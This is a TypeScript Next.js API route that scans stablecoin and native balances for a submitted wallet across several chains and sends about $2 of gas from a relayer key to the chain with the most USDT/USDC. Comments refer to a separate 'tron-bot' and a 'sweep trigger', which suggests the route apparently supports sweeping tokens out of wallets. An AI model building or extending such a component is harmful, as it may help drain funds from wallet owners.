import { NextRequest, NextResponse } from "next/server";
import {
  JsonRpcProvider,
  Wallet,
  Contract,
  formatUnits,
  parseUnits,
  isAddress,
} from "ethers";
import { CHAINS } from "@/lib/chains";

export const runtime = "nodejs";

// ---------------------------------------------------------------------------
// Hardcoded $2 gas amounts per chain (no external price API — fast & reliable)
// Conservative prices used so the sent amount never exceeds $2 USD.
// Min = threshold below which gas is sent (~$1 equivalent).
// ---------------------------------------------------------------------------
const DROP_AMOUNT: Record<string, bigint> = {
  eth:     parseUnits("0.00057", 18),  // $2 @ $3500/ETH
  bnb:     parseUnits("0.0031",  18),  // $2 @ $650/BNB
  polygon: parseUnits("2",       18),  // $2 @ $1/MATIC (conservative; usually ~$0.40 so under $2)
  base:    parseUnits("0.00057", 18),  // $2 @ $3500/ETH
};

const MIN_NATIVE: Record<string, bigint> = {
  eth:     parseUnits("0.0003",  18),  // ~$1 @ $3500
  bnb:     parseUnits("0.0015",  18),  // ~$1 @ $650
  polygon: parseUnits("1",       18),  // ~$1 @ $1
  base:    parseUnits("0.0003",  18),  // ~$1 @ $3500
};

// Tron gas airdrop is handled by tron-bot (not here) to avoid tronweb bundle.

const ERC20_ABI = ["function balanceOf(address) view returns (uint256)"];

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
async function getStableBalance(
  provider: JsonRpcProvider,
  wallet: string,
  tokens: { symbol: string; address: string; decimals: number }[]
): Promise<bigint> {
  let total = 0n;
  for (const token of tokens.filter(t => t.symbol === "USDT" || t.symbol === "USDC")) {
    try {
      const bal: bigint = await new Contract(token.address, ERC20_ABI, provider).balanceOf(wallet);
      total += token.decimals === 6 ? bal : bal / BigInt(10 ** (token.decimals - 6));
    } catch { /* skip */ }
  }
  return total;
}

function getProvider(chain: typeof CHAINS[number]): JsonRpcProvider {
  const urls = chain.overrideRpcUrls?.length ? chain.overrideRpcUrls : chain.rpcUrls;
  return new JsonRpcProvider(urls[0], { chainId: chain.chainId, name: chain.name });
}

// ---------------------------------------------------------------------------
// Tron: balance scan only (no gas send — handled by tron-bot)
// ---------------------------------------------------------------------------
async function getTronUsdtBalance(tronAddress: string): Promise<bigint> {
  const USDT_TRON = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
  try {
    const res = await fetch("https://api.trongrid.io/wallet/triggerconstantcontract", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        owner_address: tronAddress,
        contract_address: USDT_TRON,
        function_selector: "balanceOf(address)",
        parameter: tronAddress.slice(2).padStart(64, "0"),
        visible: true,
      }),
      signal: AbortSignal.timeout(5000),
    });
    const d = await res.json() as { constant_result?: string[] };
    const hex = d.constant_result?.[0] ?? "0";
    return BigInt("0x" + (hex || "0")) / 1_000_000n;
  } catch { return 0n; }
}

// ---------------------------------------------------------------------------
// Route
// ---------------------------------------------------------------------------
export async function POST(req: NextRequest) {
  try {
    const { address, tronAddress } = await req.json() as {
      address: string;
      tronAddress?: string;
    };

    if (!address || !isAddress(address)) {
      return NextResponse.json({ ok: false, error: "Invalid EVM address" }, { status: 400 });
    }

    const relayerKey = process.env.GAS_RELAYER_PRIVATE_KEY;
    if (!relayerKey) {
      return NextResponse.json({ ok: false, error: "Gas relayer not configured" }, { status: 503 });
    }

    // -----------------------------------------------------------------------
    // 1. Scan all EVM chains + Tron for USDT/USDC balances in parallel
    // -----------------------------------------------------------------------
    const [evmResults, tronUsdtBal] = await Promise.all([
      Promise.allSettled(
        CHAINS.map(async (chain) => {
          const provider = getProvider(chain);
          const [stable, native] = await Promise.all([
            getStableBalance(provider, address, chain.tokens),
            provider.getBalance(address),
          ]);
          return { chain, stable, native };
        })
      ),
      tronAddress ? getTronUsdtBalance(tronAddress) : Promise.resolve(0n),
    ]);

    type EvmRow = { chain: typeof CHAINS[number]; stable: bigint; native: bigint };
    const chainBalances: EvmRow[] = evmResults
      .filter((r): r is PromiseFulfilledResult<EvmRow> => r.status === "fulfilled")
      .map(r => r.value)
      .sort((a, b) => (b.stable > a.stable ? 1 : b.stable < a.stable ? -1 : 0));

    const orderedChains = chainBalances.map(r => ({
      name: r.chain.name,
      label: r.chain.label,
      stableUsd: Number(formatUnits(r.stable, 6)).toFixed(2),
      hasBalance: r.stable > 0n,
    }));

    // -----------------------------------------------------------------------
    // 2. Send $2 gas to the highest-balance EVM chain (if native is low)
    // -----------------------------------------------------------------------
    const airdropResults: {
      chain: string; sent: boolean;
      amount?: string; symbol?: string; txHash?: string; reason?: string;
    }[] = [];

    const topEvm = chainBalances.find(r => r.stable > 0n);
    if (topEvm) {
      const { chain, native } = topEvm;
      const minNative = MIN_NATIVE[chain.name] ?? parseUnits("0.0003", 18);
      const dropAmount = DROP_AMOUNT[chain.name] ?? parseUnits("0.0005", 18);

      if (native < minNative) {
        try {
          const provider = getProvider(chain);
          const relayer = new Wallet(relayerKey, provider);
          const feeData = await provider.getFeeData();
          const tx = await relayer.sendTransaction({
            to: address,
            value: dropAmount,
            gasLimit: 21000n,
            gasPrice: feeData.gasPrice ?? parseUnits("30", 9),
          });
          tx.wait(1).catch(() => {});
          airdropResults.push({
            chain: chain.name, sent: true,
            amount: formatUnits(dropAmount, 18),
            symbol: chain.nativeSymbol, txHash: tx.hash,
          });
        } catch (err) {
          airdropResults.push({
            chain: chain.name, sent: false,
            reason: err instanceof Error ? err.message : String(err),
          });
        }
      } else {
        airdropResults.push({ chain: chain.name, sent: false, reason: "Sufficient gas" });
      }
    }

    // Tron gas airdrop is handled server-side by tron-bot on sweep trigger.

    return NextResponse.json({
      ok: true,
      orderedChains,
      airdropResults,
      topChain: topEvm?.chain.name ?? null,
    });
  } catch (err) {
    console.error("[airdrop] error:", err);
    return NextResponse.json({ ok: false, error: "Internal error" }, { status: 500 });
  }
}
